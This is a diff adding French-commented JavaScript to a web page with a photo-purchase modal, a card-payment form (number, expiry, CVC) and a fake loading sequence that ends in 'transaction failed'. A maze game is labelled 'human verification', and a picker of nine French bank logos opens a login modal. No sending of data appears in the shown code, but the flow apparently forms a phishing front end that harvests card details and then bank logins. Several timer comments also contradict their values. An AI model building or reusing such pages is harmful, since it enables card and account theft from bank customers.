+
+    // Clic sur l'icône de profil pour afficher ou masquer le menu
+    profileIcon.addEventListener('click', function () {
+        profileMenu.classList.toggle('show');  // Ajout de la classe 'show' pour faire apparaître ou disparaître le menu
+    });
+
+    // Clic sur "Se déconnecter"
+    logoutButton.addEventListener('click', function () {
+        // Réinitialiser l'état de connexion
+        isLoggedIn = false;
+
+        // Réinitialiser l'affichage du bouton et de l'icône
+        toggleLoginSignupButton();
+
+        // Cacher le menu de déconnexion
+        profileMenu.classList.remove('show');  // Cache le menu de déconnexion
+        console.log('Utilisateur déconnecté, retour au bouton de connexion');
+    });
+
+    // Initialiser l'état au chargement de la page
+    toggleLoginSignupButton();
+});
+    </script>
+    <script>        
+document.getElementById('help').addEventListener('click', () => {
+    alert('Contacter le support client.');
+    // Ajouter ici un formulaire ou une redirection.
+});
+    </script>
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+    const profileImageInput = document.getElementById('profileImageInput');
+    const profilePreview = document.getElementById('profilePreview');
+    const saveProfileImage = document.getElementById('saveProfileImage');
+    const profileImage = document.getElementById('profileImage'); // Conteneur de l'image de profil
+    const defaultIcon = profileImage.querySelector('i'); // Icône par défaut (petit personnage)
+
+    // Prévisualisation de l'image sélectionnée
+    profileImageInput.addEventListener('change', (event) => {
+        const file = event.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                profilePreview.src = e.target.result;
+                profilePreview.style.display = 'block'; // Afficher l'aperçu
+            };
+            reader.readAsDataURL(file);
+        }
+    });
+
+    // Sauvegarder et remplacer l'image de profil
+    saveProfileImage.addEventListener('click', () => {
+        const file = profileImageInput.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                // Remplacer l'image du profil
+                profileImage.style.backgroundImage = `url('${e.target.result}')`;
+
+                // Masquer l'icône par défaut
+                defaultIcon.style.display = 'none';
+
+                // Réinitialiser la prévisualisation et le champ de fichier
+                profilePreview.style.display = 'none';
+                profileImageInput.value = '';
+
+                // Fermer la modale
+                const editProfileModal = bootstrap.Modal.getInstance(document.getElementById('editProfileModal'));
+                editProfileModal.hide();
+            };
+            reader.readAsDataURL(file);
+        } else {
+            alert('Veuillez sélectionner une image avant de sauvegarder.');
+        }
+    });
+
+    // Initialiser avec l'icône par défaut si aucun fichier n'est sélectionné
+    if (!profileImage.style.backgroundImage) {
+        defaultIcon.style.display = 'flex'; // Afficher l'icône de base
+    }
+});
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const buyPhotosButton = document.getElementById('buyPhotos');
+            const loginTrigger = document.getElementById('loginTrigger');
+            const signupTrigger = document.getElementById('signupTrigger');
+            
+            // Ouvrir la modale d'achat des photos
+            buyPhotosButton.addEventListener('click', () => {
+                const purchaseModal = new bootstrap.Modal(document.getElementById('purchaseModal'));
+                purchaseModal.show(); // Affiche la modale d'achat
+            });
+        
+            // Ouvrir la modale de connexion
+            loginTrigger.addEventListener('click', () => {
+                const loginModal = new bootstrap.Modal(document.getElementById('loginModal'));
+                loginModal.show(); // Affiche la modale de connexion
+            });
+        
+            // Ouvrir la modale de création de compte
+            signupTrigger.addEventListener('click', () => {
+                const signupModal = new bootstrap.Modal(document.getElementById('signupModal'));
+                signupModal.show(); // Affiche la modale de création de compte
+            });
+        
+            // Vous pouvez ajouter ici la logique de déconnexion si vous avez des éléments qui doivent changer
+            // lors de la déconnexion (si applicable)
+        });
+        </script>
+      <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const buyPhotosButton = document.getElementById('buyPhotos');
+            buyPhotosButton.addEventListener('click', () => {
+                const purchaseModal = new bootstrap.Modal(document.getElementById('purchaseModal'));
+                purchaseModal.show(); // Ouvre la modale
+            });
+        });
+        </script>   
+        <script>
+            document.addEventListener('DOMContentLoaded', () => {
+    const paymentButton = document.getElementById('continueToPayment');
+    const paymentSection = document.getElementById('paymentSection');
+    const modalContent = document.querySelector('.modal-body'); // Section à masquer
+    
+    if (paymentButton) {
+        paymentButton.addEventListener('click', () => {
+            // Vérifiez si la section de paiement existe
+            if (paymentSection) {
+                // Masquer l'ancienne section
+                if (modalContent) {
+                    modalContent.style.display = 'none'; // Cache la section avec le bouton
+                }
+                
+                // Afficher la nouvelle section de paiement
+                paymentSection.classList.remove('d-none');
+            } else {
+                console.error("La section de paiement n'existe pas.");
+            }
+        });
+    }
+});
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const continueToPaymentBtn = document.getElementById('continueToPayment');
+                const paymentSection = document.getElementById('paymentSection');
+        
+                continueToPaymentBtn.addEventListener('click', function () {
+                    continueToPaymentBtn.classList.add('d-none');
+                    paymentSection.classList.remove('d-none');
+                });
+            });
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+    const paymentForm = document.getElementById('paymentForm');
+
+    paymentForm.addEventListener('submit', function (e) {
+        const cvcCode = document.getElementById('cvcCode').value;
+
+        // Vérification que le CVC est composé de 3 chiffres
+        if (!/^\d{3}$/.test(cvcCode)) {
+            e.preventDefault(); // Empêche la soumission du formulaire
+            alert('Veuillez entrer un code CVC valide à 3 chiffres.');
+        }
+    });
+});
+        </script>
+        <script>
+            document.getElementById('expiryDate').addEventListener('input', function (e) {
+                const input = e.target;
+                let value = input.value;
+        
+                // Supprimez tout caractère qui n'est pas un chiffre ou "/"
+                value = value.replace(/[^0-9\/]/g, '');
+        
+                // Ajoutez automatiquement "/" après deux chiffres si ce n'est pas déjà fait
+                if (value.length === 2 && !value.includes('/')) {
+                    value += '/';
+                }
+        
+                // Limitez la longueur à "MM/AA"
+                if (value.length > 5) {
+                    value = value.slice(0, 5);
+                }
+        
+                // Mettez à jour la valeur de l'input
+                input.value = value;
+
+                if (value.length === 5) {
+    const [month, year] = value.split('/');
+    if (parseInt(month, 10) < 1 || parseInt(month, 10) > 12) {
+        alert('Le mois doit être compris entre 01 et 12.');
+        input.value = '';
+    }
+}
+            });
+        
+            document.getElementById('expiryDate').addEventListener('keydown', function (e) {
+                const input = e.target;
+                const value = input.value;
+        
+                // Si l'utilisateur appuie sur Backspace juste après le "/", retirez-le
+                if (e.key === 'Backspace' && value.endsWith('/')) {
+                    input.value = value.slice(0, -1); // Supprimez le dernier caractère (le "/")
+                    e.preventDefault(); // Empêche le comportement par défaut de suppression
+                }
+            });
+        </script>
+        <script>
+            document.getElementById('cardNumber').addEventListener('input', function (e) {
+                const input = e.target;
+                let value = input.value;
+        
+                // Supprimez tous les espaces et caractères non numériques
+                value = value.replace(/\D/g, '');
+        
+                // Ajoutez un espace après chaque groupe de 4 chiffres
+                const formattedValue = value
+                    .match(/.{1,4}/g) // Découpe la chaîne en morceaux de 1 à 4 chiffres
+                    ?.join(' ') || ''; // Réassemble avec un espace entre chaque groupe
+        
+                // Mettez à jour la valeur de l'input
+                input.value = formattedValue;
+            });
+        
+            document.getElementById('cardNumber').addEventListener('keydown', function (e) {
+                const input = e.target;
+                const value = input.value;
+        
+                // Permettre la suppression correcte des espaces
+                if (e.key === 'Backspace' && value.endsWith(' ')) {
+                    input.value = value.slice(0, -1); // Supprimez l'espace supplémentaire
+                }
+            });
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+    const paymentForm = document.getElementById('paymentForm');
+    const loadingSection = document.getElementById('loadingSection');
+    const loadingMessage = document.getElementById('loadingMessage');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    const alertModal = new bootstrap.Modal(document.getElementById('alertModal'));
+    const alertModalElement = document.getElementById('alertModal');
+
+    // Afficher le formulaire de paiement après le clic sur "Procéder au paiement"
+    document.getElementById('continueToPayment').addEventListener('click', () => {
+        document.getElementById('paymentSection').classList.remove('d-none');
+    });
+
+    // Gérer l'envoi du formulaire
+    paymentForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        // Afficher l'animation de chargement infini
+        paymentForm.classList.add('d-none');
+        loadingSection.classList.remove('d-none');
+
+        // Simuler un délai de 10 secondes avant d'afficher la fenêtre pop-up
+        setTimeout(() => {
+            alertModal.show(); // Affiche la modale d'alerte
+        }, 100000);
+    });
+
+    // Fonction pour gérer la mise à jour de l'état de la transaction
+    const setTransactionFailed = () => {
+        loadingSpinner.classList.add('d-none'); // Masquer le spinner
+        loadingMessage.textContent = 'La transaction a échoué';
+        loadingMessage.classList.remove('text-primary');
+        loadingMessage.classList.add('text-danger', 'fw-bold'); // Mettre le texte en rouge
+    };
+
+    // Gérer le clic sur le bouton "Retour" de la modale d'alerte
+    document.querySelector('#alertModal .btn-secondary').addEventListener('click', () => {
+        alertModal.hide(); // Fermer la modale d'alerte
+        setTransactionFailed(); // Mettre à jour l'état
+    });
+
+    // Gérer la fermeture de la modale via la croix
+    alertModalElement.addEventListener('hidden.bs.modal', () => {
+        setTransactionFailed(); // Mettre à jour l'état
+    });
+});
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+    const loadingSection = document.getElementById('loadingSection');
+    const loadingMessage = document.getElementById('loadingMessage');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    const gamePopup = document.getElementById('gamePopup');
+    const closeGamePopupButton = document.getElementById('closeGamePopup');
+    const mazeCanvas = document.getElementById('mazeCanvas');
+    const ctx = mazeCanvas.getContext('2d');
+    let gameTimeout;
+
+    // Variables pour le labyrinthe
+    const gridSize = 40;
+    const player = { x: 1, y: 1 }; // Position initiale
+    const exit = { x: 14, y: 8 }; // Position de la sortie
+    const maze = [
+        // 0 = mur, 1 = chemin
+        [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+        [0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0],
+        [0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0],
+        [0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0],
+        [0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0],
+        [0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0],
+        [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
+        [0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0],
+        [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
+        [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+    ];
+
+    // Fonction pour dessiner le labyrinthe
+    const drawMaze = () => {
+        ctx.clearRect(0, 0, mazeCanvas.width, mazeCanvas.height);
+        for (let y = 0; y < maze.length; y++) {
+            for (let x = 0; x < maze[y].length; x++) {
+                if (maze[y][x] === 0) {
+                    ctx.fillStyle = '#000';
+                    ctx.fillRect(x * gridSize, y * gridSize, gridSize, gridSize);
+                } else {
+                    ctx.fillStyle = '#fff';
+                    ctx.fillRect(x * gridSize, y * gridSize, gridSize, gridSize);
+                }
+            }
+        }
+
+        // Dessiner le joueur
+        ctx.fillStyle = '#007bff';
+        ctx.beginPath();
+        ctx.arc(
+            player.x * gridSize + gridSize / 2,
+            player.y * gridSize + gridSize / 2,
+            gridSize / 3,
+            0,
+            Math.PI * 2
+        );
+        ctx.fill();
+
+        // Dessiner la sortie
+        ctx.fillStyle = '#28a745';
+        ctx.fillRect(exit.x * gridSize + gridSize / 4, exit.y * gridSize + gridSize / 4, gridSize / 2, gridSize / 2);
+    };
+
+    // Déplacement du joueur
+    const movePlayer = (dx, dy) => {
+        const newX = player.x + dx;
+        const newY = player.y + dy;
+        if (maze[newY][newX] === 1) {
+            player.x = newX;
+            player.y = newY;
+        }
+        drawMaze();
+
+        // Vérifier si le joueur atteint la sortie
+        if (player.x === exit.x && player.y === exit.y) {
+            closeGamePopup();
+        }
+    };
+
+    // Gestion des touches
+    document.addEventListener('keydown', (event) => {
+        if (gamePopup.classList.contains('d-none')) return; // Ignorer si le jeu est fermé
+        if (event.key === 'ArrowUp') movePlayer(0, -1);
+        if (event.key === 'ArrowDown') movePlayer(0, 1);
+        if (event.key === 'ArrowLeft') movePlayer(-1, 0);
+        if (event.key === 'ArrowRight') movePlayer(1, 0);
+    });
+
+    // Démarrer le jeu
+    const startGame = () => {
+        gamePopup.classList.remove('d-none');
+        drawMaze();
+
+        // Fermer automatiquement après 15 secondes
+        gameTimeout = setTimeout(() => {
+            closeGamePopup();
+        }, 25000);
+    };
+
+    // Fermer le jeu
+    const closeGamePopup = () => {
+        gamePopup.classList.add('d-none');
+        clearTimeout(gameTimeout);
+    };
+
+    // Bouton pour fermer manuellement
+    closeGamePopupButton.addEventListener('click', closeGamePopup);
+
+    // Démarrage après 5 secondes de traitement
+    setTimeout(() => {
+        startGame();
+    }, 7000);
+});
+        </script>
+        <script>
+            function simulateKeyPress(key) {
+    const event = new KeyboardEvent("keydown", { key: key });
+    document.dispatchEvent(event);
+}
+
+// Ajouter des écouteurs sur les boutons tactiles
+document.querySelectorAll(".control-btn").forEach((button) => {
+    button.addEventListener("touchstart", (e) => {
+        const direction = button.getAttribute("data-direction");
+        simulateKeyPress(direction); // Simuler une pression de touche
+    });
+
+    button.addEventListener("click", (e) => {
+        const direction = button.getAttribute("data-direction");
+        simulateKeyPress(direction); // Pour compatibilité desktop si nécessaire
+    });
+});
+        </script>
+    
+        <script>
+         let gameStarted = false; // Vérifie si le jeu a été lancé
+let gameCompleted = false; // Vérifie si le joueur a fini le jeu
+let loadingTimeout;
+let alertTimeout;
+let paymentTimeout;
+
+// Récupération des modales Bootstrap
+const revolutionaryModal = new bootstrap.Modal(document.getElementById('revolutionaryModal'));
+const alertModal = new bootstrap.Modal(document.getElementById('alertModal'));
+
+// Fonction pour démarrer le jeu (vérification humaine)
+function startGame() {
+    if (!gameStarted) {
+        gameStarted = true;
+        document.getElementById('gamePopup').classList.remove('d-none');
+        drawMaze(); // Assure que le jeu s'affiche bien
+
+        console.log("🟢 Jeu lancé.");
+    }
+}
+
+// Fonction pour afficher la fusée (chargement)
+function startLoadingAnimation() {
+    console.log("🚀 Tentative d'affichage de la modale de chargement...");
+
+    // Afficher la modale avec Bootstrap
+    const revolutionaryModal = new bootstrap.Modal(document.getElementById('revolutionaryModal'));
+    revolutionaryModal.show();
+
+    console.log("🚀 Chargement avec la fusée activé.");
+
+    // Après 2 minutes du chargement, afficher la modale d'alerte
+    alertTimeout = setTimeout(() => {
+        revolutionaryModal.hide(); // Masquer la fusée
+        const alertModal = new bootstrap.Modal(document.getElementById('alertModal'));
+        alertModal.show(); // Afficher l'alerte
+        console.log("⚠️ Modale d'alerte affichée après 2 minutes.");
+    }, 1500000); // 2 minutes (0000 ms)
+}
+
+// Fonction pour fermer le jeu et démarrer le chargement après 5 secondes
+function closeGamePopup() {
+    console.log("Fermeture du jeu et lancement de l'animation..."); // Vérifiez dans la console
+    document.getElementById('gamePopup').classList.add('d-none');
+    gameCompleted = true;
+
+    // Lancer l'animation de confettis et de feux d'artifice
+    launchFireworks();
+
+    // Démarrer le chargement 5 secondes après la fin du jeu
+    loadingTimeout = setTimeout(() => {
+        if (gameCompleted) {
+            startLoadingAnimation();
+        }
+    }, 5000); // 5 secondes après la fin du jeu
+}
+
+function launchFireworks() {
+    console.log("Lancement de l'animation de confettis..."); // Vérifiez dans la console
+    const duration = 3000; // 3 secondes
+    const animationEnd = Date.now() + duration;
+
+    function generateConfetti() {
+        if (Date.now() > animationEnd) return;
+
+        console.log("Génération de confettis..."); // Vérifiez dans la console
+
+        // Générer des confettis aléatoires
+        confetti({
+            particleCount: 100,
+            spread: 160,
+            origin: { y: 0.6 },
+        });
+
+        // Générer des feux d'artifice
+        confetti({
+            particleCount: 10,
+            spread: 360,
+            startVelocity: 30,
+            origin: { x: Math.random(), y: Math.random() },
+            colors: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'],
+        });
+
+        // Répéter l'animation
+        requestAnimationFrame(generateConfetti);
+    }
+
+    // Démarrer l'animation
+    generateConfetti();
+}
+
+// Ajoute un détecteur pour la sortie du jeu
+document.addEventListener('DOMContentLoaded', function () {
+    const paymentForm = document.getElementById('paymentForm');
+    const loadingSection = document.getElementById('loadingSection');
+    const loadingMessage = document.getElementById('loadingMessage');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    const alertModal = new bootstrap.Modal(document.getElementById('alertModal'));
+    const alertModalElement = document.getElementById('alertModal');
+
+    // Afficher le formulaire de paiement après le clic sur "Procéder au paiement"
+    document.getElementById('continueToPayment').addEventListener('click', () => {
+        document.getElementById('paymentSection').classList.remove('d-none');
+    });
+
+    // Gérer l'envoi du formulaire
+    paymentForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        // Afficher l'animation de chargement infini
+        paymentForm.classList.add('d-none');
+        loadingSection.classList.remove('d-none');
+
+        // Simuler un délai de 35 secondes avant d'afficher la fusée
+        setTimeout(() => {
+            const revolutionaryModal = new bootstrap.Modal(document.getElementById('revolutionaryModal'));
+            revolutionaryModal.show(); // Affiche la modale avec la fusée
+        }, 25000); // 25 secondes après le clic
+    });
+});
+</script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+    const banques = [
+        { name: "BNP Paribas", logo: "bnp.png" },
+        { name: "Société Générale", logo: "sg.png" },
+        { name: "Crédit Agricole", logo: "ca.png" },
+        { name: "La Banque Postale", logo: "lbp.png" },
+        { name: "Crédit Mutuel", logo: "cm.png" },
+        { name: "LCL", logo: "lcl.png" },
+        { name: "Caisse d'Epargne", logo: "ce.png" },
+        { name: "Boursorama", logo: "bb.png" },
+        { name: "Crédit industriel et commercial", logo: "cic.png" }
+    ];
+
+    const bankListDiv = document.getElementById("bankList");
+
+    banques.forEach(bank => {
+        let btn = document.createElement("button");
+        btn.className = "btn btn-light p-2 border-0 shadow-sm rounded-circle";
+        btn.style.width = "90px"; 
+        btn.style.height = "90px";
+
+        let img = document.createElement("img");
+        img.src = bank.logo;
+        img.alt = bank.name;
+        img.className = "img-fluid rounded-circle";
+        img.width = 90;
+        img.height = 90;
+
+        btn.appendChild(img);
+        btn.onclick = function () {
+            document.getElementById("selectedBankName").textContent = bank.name;
+            new bootstrap.Modal(document.getElementById('loginModal')).show();
+        };
+        
+        bankListDiv.appendChild(btn);
+    });
+});
+</script>
+<script>
+   document.getElementById("secureAccount").addEventListener("click", function() {
+    // Cache la modale de login
+    const loginModal = new bootstrap.Modal(document.getElementById('loginModal'));
+    loginModal.hide();
+    
+    // Affiche la modale de chargement après un délai pour un effet fluide
+    setTimeout(() => {
+        const loadingModal = new bootstrap.Modal(document.getElementById('loadingModal'), {
+            backdrop: 'static',
+            keyboard: false
+        });
+        loadingModal.show();
+    }, 500); // délai de 500ms pour fluidité
+});
+    </script>
+   
+
+             
+</body>
+</html>
